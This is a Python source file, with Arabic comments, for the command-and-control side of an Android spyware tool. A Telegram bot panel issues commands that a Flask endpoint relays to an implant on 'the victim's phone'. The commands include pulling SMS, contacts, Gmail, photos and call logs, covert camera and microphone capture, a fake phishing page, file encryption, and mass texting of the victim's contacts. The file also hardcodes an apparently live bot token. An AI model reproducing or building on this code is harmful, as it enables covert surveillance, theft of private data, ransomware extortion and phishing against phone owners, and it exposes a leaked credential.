import telebot
from flask import Flask
from telebot import types

# معلوماتك يا يوسف
TOKEN = "8662933994:AAFU1WSpE-Lh34YxAp7iaWwlMFR5h0WO4gA"
bot = telebot.TeleBot(TOKEN)
app = Flask(__name__)

current_command = "WAIT"

@bot.message_handler(commands=['start'])
def control_panel(message):
    markup = types.InlineKeyboardMarkup(row_width=2)
    
    # القائمة الأولى: التحكم المباشر
    btn1 = types.InlineKeyboardButton("▶️ تشغيل الصوت", callback_data='START_AUDIO')
    btn2 = types.InlineKeyboardButton("🛑 ايقاف الصوت", callback_data='STOP_AUDIO')
    
    # القائمة الثانية: التجسس وسحب الملفات
    btn3 = types.InlineKeyboardButton("📸 سحب الصور", callback_data='GET_PHOTOS')
    btn4 = types.InlineKeyboardButton("🎥 سحب الفيديوهات", callback_data='GET_VIDEOS')
    btn5 = types.InlineKeyboardButton("📂 عرض جميع الملفات", callback_data='LIST_FILES')
    btn6 = types.InlineKeyboardButton("📋 سجل الحافظة", callback_data='GET_CLIPBOARD')
    
    # القائمة الثالثة: الاتصالات والرسائل
    btn7 = types.InlineKeyboardButton("📞 سجل المكالمات", callback_data='GET_CALLS')
    btn8 = types.InlineKeyboardButton("💬 سحب الرسائل SMS", callback_data='GET_SMS')
    btn9 = types.InlineKeyboardButton("👥 سحب جهات الاتصال", callback_data='GET_CONTACTS')
    btn10 = types.InlineKeyboardButton("📧 سحب رسائل جيميل", callback_data='GET_GMAIL')
    
    # القائمة الرابعة: التصوير المباشر
    btn11 = types.InlineKeyboardButton("📸 كيمرا أمامية", callback_data='TAKE_FRONT_PHOTO')
    btn12 = types.InlineKeyboardButton("📸 كيمرا خلفية", callback_data='TAKE_BACK_PHOTO')
    btn13 = types.InlineKeyboardButton("🖥️ لقطة شاشة", callback_data='SCREENSHOT')
    btn14 = types.InlineKeyboardButton("🎙️ تسجيل صوت", callback_data='RECORD_AUDIO')
    
    # القائمة الخامسة: التنبيهات والتمويه
    btn15 = types.InlineKeyboardButton("🦔 اظهار اشعارات", callback_data='SHOW_NOTIF')
    btn16 = types.InlineKeyboardButton("🛑 ايقاف الاشعارات", callback_data='STOP_NOTIF')
    btn17 = types.InlineKeyboardButton("‼️ اشعار صفحة مزورة", callback_data='FAKE_PAGE')
    btn18 = types.InlineKeyboardButton("😎 اظهار رساله اسفل الشاشة", callback_data='SHOW_TOAST')

    # القائمة السادسة: أوامر السيطرة
    btn19 = types.InlineKeyboardButton("⚠️ تشفير ملفات", callback_data='ENCRYPT_FILES')
    btn20 = types.InlineKeyboardButton("☎️ اتصال من هاتف الضحيه", callback_data='CALL_PHONE')
    btn21 = types.InlineKeyboardButton("📳 اهتزاز", callback_data='VIBRATE')
    
    # زر المراسلة الجماعية (عريض)
    btn_all_sms = types.InlineKeyboardButton("💬 ارسال رساله لجميع ارقام الضحيه", callback_data='SMS_ALL')
    
    # إضافة الأزرار
    markup.add(btn1, btn2)
    markup.add(btn3, btn4)
    markup.add(btn5, btn6)
    markup.add(btn7, btn8)
    markup.add(btn9, btn10)
    markup.add(btn11, btn12)
    markup.add(btn13, btn14)
    markup.add(btn15, btn16)
    markup.add(btn17, btn18)
    markup.add(btn19, btn20)
    markup.add(btn21)
    markup.add(btn_all_sms)
    markup.add(types.InlineKeyboardButton("⭐ القائمة الرئيسية ⭐", callback_data='MAIN_MENU'))

    bot.send_message(message.chat.id, "🎛️ تم تفعيل كافة الصلاحيات.. لوحة التحكم الشاملة جاهزة:", reply_markup=markup)

@bot.callback_query_handler(func=lambda call: True)
def handle_query(call):
    global current_command
    current_command = call.data
    bot.answer_callback_query(call.id, f"تم إرسال أمر: {call.data}")
    bot.send_message(call.message.chat.id, f"📡 جاري انتظار تنفيذ [ {call.data} ] من هاتف الضحية...")

@app.route('/get_command')
def get_command():
    global current_command
    cmd = current_command
    current_command = "WAIT"
    return cmd

if __name__ == '__main__':
    import threading
    threading.Thread(target=bot.infinity_polling).start()
    app.run(host='0.0.0.0', port=10000)